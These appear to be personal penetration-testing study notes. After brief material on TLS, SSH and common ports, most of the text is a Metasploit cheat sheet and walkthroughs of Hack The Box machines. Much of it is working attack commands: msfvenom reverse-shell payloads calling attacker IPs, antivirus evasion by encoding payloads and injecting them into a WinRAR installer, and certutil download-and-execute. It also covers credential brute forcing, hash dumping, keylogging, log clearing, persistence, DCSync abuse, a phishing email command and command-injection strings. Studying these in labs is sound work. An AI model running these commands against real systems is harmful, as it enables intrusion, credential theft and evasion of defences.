    The client responds with a ClientKeyExchange, which contains additional information required to generate the master key. Furthermore, it switches to use encryption and informs the server using the ChangeCipherSpec message.
    The server switches to use encryption as well and informs the client in the ChangeCipherSpec message.

If this still sounds sophisticated, don’t worry; we only need the gist of it. A client was able to agree on a secret key with a server that has a public certificate. This secret key was securely generated so that a third party monitoring the channel wouldn’t be able to discover it. Further communication between the client and the server will be encrypted using the generated key.

Consequently, once an SSL/TLS handshake has been established, HTTP requests and exchanged data won’t be accessible to anyone watching the communication channel.

As a final note, for SSL/TLS to be effective, especially when browsing the web over HTTPS, we rely on public certificates signed by certificate authorities trusted by our systems. In other words, when we browse to TryHackMe over HTTPS, our browser expects the TryHackMe web server to provide a signed certificate from a trusted certificate authority, as per the example below. This way, our browser ensures that it is communicating with the correct server, and a MITM attack cannot occur.

we can see the following information:

    To whom is the certificate issued? That is the name of the company that will use this certificate.
    Who issued the certificate? This is the certificate authority that issued this certificate.
    Validity period. You don’t want to use a certificate that has expired, for instance.

Luckily, we don’t have to check the certificate manually for every site we visit; our web browser will do it for us. Our web browser will ensure that we are talking with the correct server and ensure that our communication is secure, thanks to the server’s certificate.


-=-=-==
SSH
To use SSH, you need an SSH server and an SSH client. The SSH server listens on port 22 by default. The SSH client can authenticate using:

    A username and a password
    A private and public key (after the SSH server is configured to recognize the corresponding public key)


--=-=
Summary 
Protocol 	TCP Port 	Application(s) 	                Data Security
FTP 	        21 	        File Transfer 	                Cleartext
FTPS 	        990 	        File Transfer 	                Encrypted
HTTP 	        80 	        Worldwide Web 	                Cleartext
HTTPS 	        443 	        Worldwide Web 	                Encrypted
IMAP 	        143 	        Email (MDA) 	                Cleartext
IMAPS 	        993 	        Email (MDA) 	                Encrypted
POP3 	        110 	        Email (MDA) 	                Cleartext
POP3S 	        995 	        Email (MDA) 	                Encrypted
SFTP 	        22 	        File Transfer 	                Encrypted
SSH 	        22 	        Remote Access and File Transfer Encrypted
SMTP 	        25 	        Email (MTA) 	                Cleartext
SMTPS 	        465 	        Email (MTA) 	                Encrypted
Telnet 	        23 	        Remote Access 	                Cleartext




Vulnerability	Description
Operating System
	These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
(Mis)Configuration-based
	These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
Weak or Default Credentials
	Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
Application Logic
	These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
Human-Factor
	Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.

-=-=-=-=
'The Metasploit Framework'
  5.1 Overview
    MSF Architecture
      Interfaces: MSFconsole, MSFcli, Armitage & Web
      Modules: 
        exploit, 
        payload:
          > It is an advanced multi-functional paylaod that is executed in memory on the target system making it difficult to detect. It is not downloaded to the target system or is not executed on disk. As a result, no traces of the payload are left or are found on the target system
          Stageless (or Non-Staged payload): Payload that is sent to the taget system as is along with the exploit
          Staged payload : It is sent to the target in two parts whereby:
            Stagers: Stagers are typically used to establish a stable communication channel between the attacker and target, after which a stage payload is downloaded and executed on the target system
            Stage: Payload components that are downloaded by the stager

        encoder(For example, shikata_ga_nai is used to encode Windows payloads)
        NOPS(Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed)
        auxiliary
      Libraries: Rex, MSF Core & MSF Base
      
    MSF module locations
      MSF stores modules under the following directory
        /usr/share/metasploit-framework/modules
      User specified modules are stored here:
        ~/.ms5/modules

    Starting
      msfdb run
        db_status
   MSFconsole fundamentals
    version
    show -h
      show all // Show all modules
      show exploits 
    search portscan
      use auxiliary/scanner/portscan/tcp 
      (Once you have used it) back
    search -h
      search cve:2017 type:exploit platform:-windows
      search cve:2017 type:exploit platform:+windows
      search eternalblue
    sessions
    connect -h 
      connect 192.168.188.126 80

  Creating and managin workspaces
    workspace -h
      workspace
      hosts
      workspace -a Test
      workspace 
      workspace default
      workspace INE
      workspace -d Test //delete
      workspace -r INE PTA //rename

  Information Gathering & Enumeration
    Port scanning & enumeration with nmap
      nmap -Pn -sV -O 10.2.33.173 -oX windows_server_2012_results
      Importing nmap scan results into msf
        service postresql start
        msfconsole
          db_status
          workspace -a Win2k12
            db_import /root/windows_server_2012_results
            hosts
            services
            loot
            creds
          workspace -a Nmap_MSF
            db_nmap -Pn -sV -O 10.2.33.173 
            vulns
    Port scanning with auxiliary modules //Ideal for pivoting
      msfconsole
        search portscan
          use auxiliary/scanner/portscan/tcp
        //Once we have gained a meterpreter session
          meterpreter > run autoroute -s 192.112.57.2 //The IP on the other interface of the first target machine
        //BG this session and run portscan against the new target (192.112.57.3)
          Bash Script:
          #!/bin/bash
          for port in {1..1000}; do
          timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
          done)
      FTP enumeration
        search portscan
          use auxiliary/scanner/portscan/tcp
        search ftp type:auxiliary
          use auxiliary/scanner/ftp/ftp_version
            [Manually: nc -vn 192.19.87.3]
            searchsploit the version
          use auxiliary/scanner/ftp/ftp_login //brute force 
            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
            set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
          use auxiliary/scanner/ftp/anonymous
            
      SMB enumeration
        setg RHOSTS 192.91.46.3
        search type:auxiliary smb
        use auxiliary/scanner/smb/smb_version
        use auxiliary/scanner/smb/smb_enumshares
          set showfiles true
        use auxiliary/scanner/smb/smb_login
          set smbuser admin
          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 

      Web Server enumeration
        search type:auxiliary http
        use auxiliary/scanner/http/http_version
        use auxiliary/scanner/http/http_header
        use auxiliary/scanner/http/http_put
          set filename test.txt
          set filedad "Welcome"
        use auxiliary/scanner/http/http_login
        use auxiliary/scanner/http/robots_txt
        use auxiliary/scanner/http/dir_scanner
        use auxiliary/scanner/http/brute_dirs
        use auxiliary/scanner/http/dir_listing
        use auxiliary/scanner/http/files_dir
          set auth_uri /secure/ //The directory target
          unset userpass_file for not be equal to user_file
        use auxiliary/scanner/http/apache_userdir_enum

      MySQL enumeration
        search type:auxiliary mysql
        use auxiliary/scanner/mysql/mysql_version
        use auxiliary/scanner/mysql/mysql_login
          set username root
          set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
        use auxiliary/scanner/mysql/mysql_enum
        use auxiliary/scanner/mysql/mysql_sql //To execute commands
        use auxiliary/scanner/mysql/mysql_file_enum
          set file_list /usr/share/metasploit-framework/data/wordlists/directory.txt
        use auxiliary/scanner/mysql/mysql_hashdump
        use auxiliary/scanner/mysql/mysql_schemadump
        use auxiliary/scanner/mysql/msyql_writable_dirs

      SSH enumeration
        workspace -a SSH_enum
        search type:auxiliary name:ssh
        use auxiliary/scanner/ssh
          ssh_version
          ssh_login //Password authentication
            set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
            set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
          ssh_login_pubkey //Key based authentication
          ssh_enumusers

      SMTP enumeration (SPF,DKIM & DMARC) => https://mxtoolbox.com/dmarc/details/what-is-a-dmarc-record
        search type:auxiliary name:smtp
        use auxiliary/scanner/stmp
          smtp_version
          smtp_enum
        manually
          ismtp
            ismtp -h 192.22.47.3 -e /mydic.txt
          sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
           swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197

  Vulnerability scanning
    service postgresql start
    msfconsole -q
      db_status
      workspace -a MS3
      db_nmap -sS -sV -O 10.10.10.4
      hosts
      services
      search type:exploit name:Microsoft IIS
      
      analyze 
      vulns
    //If we would like to import Nessus results
        db_import /home/MS3_fkthix.nessus
        vulns -p445
        search cve:2017 name:smb or another different would be search cve:2012 name:rdp
    > You can use https://github.com/hahwul/metasploit-autopwn
      msfconsole -q
        load db_autopwn(Deprecated but it still works. Manual installation)
        db_autopwn -p -t -PI 445
    WMAP(web application vulnerability scanner)
      available as an MSF plugin and can be loadad directly in MSF
      load wmap
        wmap_sites -a 192.157.89.3
        wmap_targets -t http://192.157.89.3
        wmap_sites -l //Available sites
        wmap_targets -l //Available targets
        wmap_run -t //All the modules that will be used
        wmap_run -e //Run it
        wmap_vulns -l
      use auxiliary/scanner/http/options
      use auxiliary/scanner/http/http_put
        set PATH /data

  Client-side attacks
    Generating payloads with Msfvenom
      Msfvenom is a combination of two utilities, namely; msfpayload and msfencode
      msfvenom --list payloads
      msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx86.exe
      msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx64.exe
      msfvenom --list formats //List valid executable formats 
      msfvenom  -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx86
      msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f elf > payloadx64
        elf //Linux binary

        How to transfer this files?
          sudo python -m SimpleHttpServer 80
        
        We await from a connection back //Example
          msfconsole -q 
           set payload linux/x86/meterpreter/reverse_tcp
           use exploit/multi/handler 

    Encoding payloads with Msfvenom
      We can evade older signature based AV solutions by encoding our payloads.
      msfvenom --list encoders
        x86/shikata_ga_nai
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > encodedx86.exe
        //Pay attention with the iterations
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 x86/shikata_ga_nai -f elf > encodedx86Linux

    Injecting payloads into Windows portable executables //To avoid AV detection
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > winrar.exe
      msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4126 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > winrar-new.exe //To mantain the original functioning. It will not work all times
      msfconsole -q 
        use multi/handler
        //Once we have a session.
          sysinfo
          run post/windows/manage/migrate 
    Automating Metasploit with resource scripts
      ls -al /usr/share/metasploit-framework/scripts/resource      
      vim handler.rc
        use multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp 
        set LHOST 10.10.10.5
        set LPORT 4126
        run
      msfconsole -r handler.rc
      //Another
      vim portscan.rc
        use auxiliary/scanner/portscan/tcp
        set RHOSTS 10.10.10.7
        run
      msfconsole -r portscan.rc
      //Other
      vim db_status.rc
        db_status
        workspace 
        workspace -a Test
      //Upload it directly from msfconsole
      msfconsole -q
        resource ~/Documents/handler.rc //Load a resource script
        //Save last commands with makerc
          [msf](Jobs:0 Agents:0) exploit(multi/handler) >> makerc ~/Desktop/ajgs/
          [*] Saving last 4 commands to ~/Desktop/ajgs/ ...
    Exploitation
      Windows Exploitation
        Exploiting a vulnerable HTTP file server
          > You can't host a website on the HTTP file server (For example: Rejetto HFS ==> Free and open source)
          service postgresql start
          msfconsole -q
            db_status
            workspace -a HFS
            db_nmap -sS -sV -O 10.2.23.159
            search type:exploit name:rejetto
            use exploit/windows/http/rejetto_hfs_exec
            set payload //It is necessary because if you don't specify the payload it may assign an x86 instead an x64
        Exploiting Apache Tomcat
          It is a free and open source Java servlet web server
          It is used to build and host dynamic websites and web applications based on the Java software platform
          It utilizes the HTTP protocol to facilitate the underlying communication between the server and clients
          It runs on TCP port 8080 by default
          What's the difference between Apache and Apache Tomcat?
            > The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP
            > The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed by Java
          msfconsole -q
          //After using db_nmap
            services  //To check open ports
            search type:exploit tomcat_jsp
            use exploit/multi/http/tomcat_jstp_upload_bypass
              info
              set payload java/jsp_shell_bind_tcp
              set shell cmd
              //In another tab to migrate to a meterpreter shell
              msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=4126 -f exe > meterpreter.exe
              python3 -m http.server 80
              certutil -urlcache -f http://10.10.10.4/meterpreter.exe meterpreter.exe
            vim handler.rc
              use multi/handler 
              set PAYLOAD windows/meterpreter/reverse_tcp
              set LHOST 10.10.5.4
              set LPORT 4126
              run
            msfconsole -r handler.rc
  Linux Exploitation
    Exploiting a vulnerable FTP server
      vsftpd is the default FTP server for Ubuntu, CentOS and Fedora
      msfconsole -q 
      //Once we have gained access to change the normal shell to a meterpreter shell
        use post/multi/manage/shell_to_meterpreter
    Exploiting Samba
      msfconsole -q
        use exploit/linux/samba/is_known_pipename
          check
      //Once we have gained access to change the normal shell to a meterpreter shell
        use post/multi/manage/shell_to_meterpreter
          set LHOST eth1
    Exploiting a vulnerable SSH server
      libssh is a multiplataform C library implementing the SSHv2 protocol on client and server side
      use auxiliary/scanner/ssh/libssh_auth_bypass
        set spwan_pty true
          cat /etc/*release
    Exploiting SMTP
      Haraka is an open source high performance SMTP server developed in Node.js.
      > Haraka versions prior to 2.8.9 are vulnerable to command injection
      msfconsole -q
        use exploit/linux/smtp/haraka
        set SRVPORT 9898
        set email_to root@attackdefense.test 
        set payload linux/x64/meterpreter_reverse_http
        set LHOST eth1

  Post exploitation fundamentals
    Meterpreter fundamentals
      > The meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect
      > It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
      sessions -C sysinfo -i 1 //Run a meterpreter command on a session
      sessions -n xodanamewhateveryoulike -i 1
      meterpreter>
        lpwd //Check present working directory on local(attacker) machine
        lls //List the files present in current directory of the local machine
        lcd //Change directory on the local machine
        cat flag
        edit flag 
        download flag5.zip /root/Desktop 
        checksum md5 /bin/bash
        getenv PATH
        getenv TERM
        search 
        search -d /usr/bin -f *backdoor*
        search -f *.jpg
        search -f *.php
        download flag1
        shell
          /bin/bash -i
        ps
        migrate 580
        migrate -N apache2
        execute -f ifconfig
    Upgrading command shells to meterpreter shells
      Using shell_to_meterpreter 
        use shell_to_meterpreter
          set session 1
          set lhost eth1
          sessions -l
      Or upgrade a commmand shell with the '-u' parameter
        sessions -u 1
    Windows Post exploitation modules
      meterpreter > 
        screenshot
        getsystem //Privesc
        hashdump
        show_mount //Drives or mounts 
        ps
        migrate 2212 //explorer.exe
      search migrate 
        use post/windows/manage/migrate
      search win_privs
        use post/windows/gater/win_privs
          set session 1
      search enum_logged_on
        use post/windows/gather/enum_logged_on_users  //Current and recently logged users
      search checkvm //To know if the target is a virtual machine
        use post/windows/gather/checkvm
      search enum_applications //Enum installed applications
        post/windows/gather/enum_applications 
      //Access the data gathered
        loot
      search type:post platform:windows enum_av
        post/windows/gather/enum_av_excluded 
      post/windows/gather/enum_computers 
      post/windows/gather/enum_patches
      post/windows/gather/enum_shares
      post/windows/manage/enable_rdp
    Bypassing UAC
      getuid
      getprivs 
      shell
        net users
        net localgroup administrators 
      use exploit/windows/local/bypassuac_injection 
        set payload windows/x64/meterpreter/reverse_tcp
        set target Windows\ x64 //If x86 target is selected
    Token Impersonation with Incognito
      load incognito
        list_tokens -u //User tokens
        impersonate_token "ATTACKDEFENSE\Administrator"
        migrate 3544 //explorer.exe. Esto lo hago porque se han quedado los access tokens cacheados
        hashdump
    Establishing persistence on windows
      use exploit/windows/local/persistence_service 
        set service_name badservice
        set payload windows/meterpreter/reverse_tcp
      //Once we have done this, we will have persistence
      use exploit/multi/handler
    Enabling RDP
      use post/windows/manage/enable_rdp
        net user administrator hacker_123! //Change administrator password
    Windows keylogging
      meterpreter >
        migrate 2460 //explorer.exe
        keyscan_start
        kesycan_dump
        keyscan_stop
    Clearing Windows Event Logs
      meterpreter > 
        clearev
    Pivoting
      meterpreter > 
        ipconfig //Copy the other IP 
        run autoroute -s 10.2.27.0/20 //-s = subnet //Only applicable to msfconsole
      use auxiliary/scanner/portscan/tcp
        set rhosts [IP victim 2]
      meterpreter > 
        portfwd add -l 1234 -p 80 -r 10.2.27.187
      db_nmap -sS -sv -p 1234 localhost 
      use exploit/windows/http/badblue_passthru
        set payload windows/meterpreter/bind_tcp
  Linux post exploitation modules
    meterpreter > 
      sysinfo
      getuid
      shell
        cat /etc/passwd
        groups root
        cat /etc/*issue
        uname -r 
        uname -a
        netstat -antp
        ps aux
        env
      post/linux/gather/enum_configs //Several interesting files
      post/linux/gather/enum_network
      post/linux/gather/enum_protections
      post/linux/gather/enum_system
      post/linux/gather/checkcontainer
      post/linux/gather/checkvm
      post/linux/gather/enum_users_history //Maybe some users have typed passwords in clear text
      post/linux/gather/hashdump
      post/linux/gather/ecryptfs_creds
      post/linux/gather/enum_psk
      post/linux/gather/enum_xchat
      post/linux/gather/phpmyadmin_credsteal
      post/linux/gather/pptpd_chap_secrets
      post/linux/manage/donwload_exec
      post/linux/manage/sshkey_persistence
      post/multi/gather/env //Enviromental variables 
      post/multi/gather/ssh_creds
      post/multi/gather/docker_creds
      post/multi/manage/system_session
        set type python
        set handler true
      > notes //system protections saved to notes
      > loot //Display the information gathered by a post exploitation module
    Exploiting a vulnerable application
      chkrootkit -v 
      use exploit/unix/local/chkrootkit
        set chkrootkit /bin/chkrootkit //The PATH of chkrootkit
    Dumping hashes with Hashdump
      use post/linux/gather/hashdump
    Establishing persistence on Linux
      Manually
        useradd -m /www/var/html/ftp -s /bin/bash
        passwd ftp
        groups root
        usermod -aG root ftp
        groups ftp
        usermod -u 15 ftp //Modify user ID
      use exploit/linux/local/cron_persistence
      use exploit/linux/local/service_persistence
        set payload cmd/unix/reverse_python
      post/linux/manage/sshkey_persistence
        set createsshfolder true
Exploitation
  Vulnerability scanning overview
    Banner grabing
      banner.nse
      nc 192.168.113.3 22
      ssh root@192.168.113.3 22 //May give you some information
    With Nmap scripts
      nmap -sV -p 80 --script=http-waf-detect 192.168.113.3
      ❯ ls -la /usr/share/nmap/scripts | grep shellshock
        nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.168.113.3
  Searching for publicly available exploits
    + Exploit-db
    + Rapid7
    + Packet strom
    + searchsploit
        ls -la /usr/share/exploitdb
        searchsploit -u //Update exploitdb
        searchsploit -t java #Por titulo
        searchsploit -p 39166 #Copia al portapapeles
        searchsploit -m 39166 #Ademas copia al directorio actual 
        searchsploit -x 39166 #Examinar
        searchsploit -x --nmap resultado.xml
        searchsploit ubuntu 14.04 -w #Busqueda en exploit.db 
        searchsploit ubuntu 14.10 -w --exclude="Linux Kernel"
        searchsploit -c ProFTPD 1.3.5 #Case sensitive
        searchsploit remote windows smb -w | grep -e "EternalBlue" //Show the URL
        searchsploit remote linux ssh
  Fixing Exploits
    cp /usr/share/windows-resources/binaries/nc.exe
  Cross-compiling exploits
    Cross-compiling is the process of compiling code for a platfrom other than the one performing the compilation
    In Windows
      apt-get install mingw-w64 gcc
      searchsploit -m 9303
      i686-w64-mingw32-gcc 9303.c -o exploit
      i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32
    In Linux
      searchsploit -m 40839
      gcc -pthread 40839 -o exploit -lcrypt
    We could use the precompiled binaries from exploitdb
      https://gitlab.com/exploit-database/exploitdb-bin-sploits

-=-=-=-
CMS 
#Joomla
In /administrator/manifests/files/joomla.xml you could access a list of files inside the root folder, and version of Joomla.
In /language/en-GB/en-GB.xml you can get the version of Joomla.
->Scripts 
  https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py
  https://github.com/OWASP/joomscan
-=-=
#Wordpress 

Under Appearance Editor 
  system shellexec exec passthru

#Automated
wpscan --url <> -o results_wpscan
wpscan --url <> -e vp,u #Enumerate vulnerable plugins and users

If we get a valid user 
wpscan --url http://internal.thm/blog/ --usernames admin --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --max-threads 50
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
-=-=-=-=
Digital Forensics

pdfinfo #Shows various metadata related
-=-=
Photo EXIF Data

EXIF stands for Exchangeable Image File Format; it is a standard for saving metadata to image files. Whenever you take a photo with your smartphone or with your digital camera, plenty of information gets embedded in the image. The following are examples of metadata that can be found in the original digital images:

    Camera model / Smartphone model
    Date and time of image capture
    Photo settings such as focal length, aperture, shutter speed, and ISO settings

Because smartphones are equipped with a GPS sensor, finding GPS coordinates embedded in the image is highly probable. The GPS coordinates, i.e., latitude and longitude, would generally show the place where the photo was taken.

exiftool image.jp

steghide embed -ef '/root/secret.txt' -cf '/root/FatBird.jpg' -p password123
steghide extract -sf '/root/FatBird.jpg' -p password123 -xf '/root/secret.txt

display file.wav
play file.wav
-=-=-=-=-
MITRE

-=-=-=-=-=-=
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
-=-=-=-=-==
Over the wire 
--> Bandit 
cat bandit0 == echo `cat bandit0` #It will replace the content
cat - # Refers to stdin
strings ./* or file ./*
find inhere/ -readable -size 1033c ! -perm /111 2>/dev/null
find / -user bandit7 -group bandit6 -size 33c -exec cat {} \; 2>/
dev/null

gunzip 
bzip2 -> bunzip2
tar ---> tar xf 


cat /etc/bandit_pass/bandit14 | nc localhost 30000
curl -s -X GET localhost:30000 -u bandit14

ctrl u 
ctrl k 
ctrl d 
alt backspace 

-=-=-=-=
GIT 
git branch -a
git checkout [nameofthebranch]
git log "commit" | cut -d " " -f 2 | while read line; do git show $line;done| less
git grep password
git reflog
  What is difference between git log and Reflog?
  The biggest difference between Git reflog vs. log is that the log is a public accounting of the repository's commit history while the reflog is a private, workspace-specific accounting of the repo's local commits

git add key.txt
git commit
git push
#First example of doing git commits
jekyll serve
git add .
git commit -m "My first blog"
git push -u origin

git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
git status 
git add . 
git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
git push 

$0 
-=-=-=-=-
python 
#-*- coding: utf-8 -*-

-=-=-=--=
Testing things
Example on search page with PHP
  a /dev/null; cat /etc/passwd #
  . /etc/passwd #
-=-=-=-=-
Java 
gunzip a jar 
strings or javap -c <file>

-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==
Machines
#Windows
$Silo
crapmapexec smb 10.129.95.188
smbclient -L 10.129.95.188 -N 
downloading odat github ==> after installing ==> sqlplus64 to test ==> python3 odat.py --help ==> ❯ python3 odat.py sidguesser -s 10.129.95.188 #to know valid sids ==> Use this dictionary /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt but change format to 'username/password'==> ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f exe -o malito.exe ==> ❯ python3 odat.py utlfile -s 10.129.95.188  -d XE -U 'scott' -P 'tiger' --putFile /Temp badcat.exe payload/malito.exe --sysdba ==> Exec this file and nc. ==> NT/authority system
-=-=-=-=-=-=
Lame
smbclient to list shares #If we have this problem we could use --option="client min protocol=NT1"   ❯ smbclient -L 10.129.122.21 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED==> ❯ smbclient -L //10.129.122.21 --option="client min protocol=NT1" #connect to tmp ==> ❯ smbclient -L \\10.129.122.21\tmp -N --option="client min protocol=NT1" -c "dir" ==> Search for an exploit to authenticate ==> We could use find ==> find / -type f \( -name "user.txt" -o -name "root.txt" \) | xargs cat
-=-=-=-=-=-=
Forest
dig axfr  @10.10.10.161 htb.local ==> Initial enumeration with rpc client ==> enumdomusers, enumdomgroups, querygroup 0x200 , querygroupmem 0x200, queryuser 0xf14 crackmapexec smb 10.129.69.58 ==> rpcclient -U "" 10.129.69.58 -N -c "enumdomusers" #Check if you can get a TGT (dont require pre auth) ==> ❯ rpcclient -U "" 10.129.69.58 -N  -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > ../content/users.txt ==>  impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt ==> Check if credentials are valid with ❯ crackmapexec smb 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' #If we have a + the creds are valid. If Pwned we could connect with PSexec to an interactive shell ==> Check if you can get a TGS with ❯ GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.129.69.58 -dc-ip 10.129.69.58 2>/dev/null ==> ❯ sudo ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.69.58 #If not valid credentials try this. service apache2 start and in browser localhost/ ==> If there is nothing interest, check again credentials with ❯ crackmapexec winrm 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' #If Pwn3d!  get evil-winrm with ❯ gem install evil-winrm ==> ❯ evil-winrm -i 10.129.69.58 -u 'svc-alfresco' -p 's3rvice' ==> 
impacket-smbserver share . -smb2support -username df -password df ==> [victim machine] net use \\10.129.9.233\share /u:df df ==> net use /d \\10.10.14.72\share 
[Privilege escalation] ==> Use bloodhound with apt install neo4j bloodhound -y ==> neo4j console #Maybe you need to change java version to 11 ❯ sudo update-alternatives --config java ==> ❯ bloodhound &> /dev/null & ; disown ==> If you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4jIf you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4jIf you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4j ==> You need a recollector for Bloodhound like SharpHound.ps1 from puckiestyle; wget it in raw and from evil-winrm upload SharpHound.ps1 ==> import-module .\SharpHound.ps1 ==> We could check for what we want cat SharpHound.ps1 | grep "Invoke-BloodHound" and PS C:\> Invoke-BloodHound -CollectionMethod All ==> download this zip and import it with upload data in bloodhound ==> 
#Abusing account operators ==> net user ajgs ajgs123$! /add /domain ==> Abusing *Exchange Windows Permissions* Group with net group "Exchange Windows Permissions" ajgs /add ==> Check it with net user ajgs ==>  Do you obtain some hash with impacket-secretsdump htb.local/ajgs@10.129.69.58 ? ==> Import powerview.ps1 and finally Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ajgs -Rights DCSync ==> impacket-secretsdump svc-alfresco:s3rvice@10.129.9.233 ==> evil-winrm -i 10.129.69.58 -u 'Administrator' -H '<HASH>' 
#As last step, we could check schtasks /query /fo TABLE and schstasks /query /tn restore /v /fo list the issue with the service
#Alternative Tool: Aclpwm (https://github.com/fox-it/aclpwn.py) ==> aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161)
#Alternative Tool when we obtain the hashes ==>  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.129.9.233
#I had to run this to use secretdsump ==> *Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
-=-=-=
Fuse
[+] Test scan ports ==> timeout 1 bash -c "echo '' > /dev/tcp/10.129.2.5/81" #If it is open echo $? = 0 #Check https://www.thegeekstuff.com/2011/01/tput-command-examples/
[+] smbmap -H 10.129.2.5 -u null
[+] ldapsearch -h 10.129.2.5 -x -s base namingcontexts && ldapsearch -h 10.129.2.5 -x -b "DC=fabricorp,DC=local"
[+] ❯ impacket-GetNPUsers fabricorp.local/ -no-pass -usersfile users.txt
[+] ❯ crackmapexec smb 10.129.2.5 -u users.txt -p users.txt
[+] ❯ cewl -w passwords http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers #Because I didn’t specify a --depth, it will go two links away from the root page, which should be enough to get everything I want.
[+] ❯ crackmapexec smb 10.129.2.5 -u users.txt -p passwords --continue-on-success | grep -vi "failure"
[+] ❯ crackmapexec smb 10.129.2.5 -u 'bhult' -p 'Fabricorp01' #If password needs to be changed ==> smbpasswd -r 10.129.2.5 -U 'bhult'
[+] ❯ crackmapexec smb 10.129.2.5 -u 'bhult' -p 'hola123.'
[+] ❯ rpcclient -U 'bhult%hola123.' 10.129.2.5 ==> enumprinters 
[+] ❯ cat new_users_rpc.txt | tr ':' ' ' | awk '{print $2}' | tr -d '[]' OR ❯ cat new_users_rpc.txt  | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]'
